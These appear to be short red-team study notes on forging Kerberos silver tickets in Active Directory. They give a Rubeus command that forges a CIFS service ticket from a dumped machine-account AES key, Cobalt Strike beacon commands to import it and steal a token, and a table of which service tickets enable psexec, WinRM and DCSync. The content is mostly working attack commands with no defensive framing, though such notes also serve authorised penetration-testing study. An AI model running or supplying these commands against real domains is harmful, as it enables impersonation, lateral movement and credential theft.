# Domain Dominance Notes

### Silver tickets

a forged service ticket, signed using the secret material (RC4/AES keys) of a computer account.

if we have dumped kerb keys for a machine account we can use them on our windows attacking machine to make a service ticket for a user
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/<machine account> /aes256:<key> /user:<user> /domain:<domain> /sid:<domain sid> /nowrap
```

import ticket in beacon
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:<base64>
steal_token 5668
```

Here are some useful ticket combinations:

Technique -	Required Service Tickets
psexec - HOST & CIFS
winrm	- HOST & HTTP
dcsync - (DCs only)	LDAP
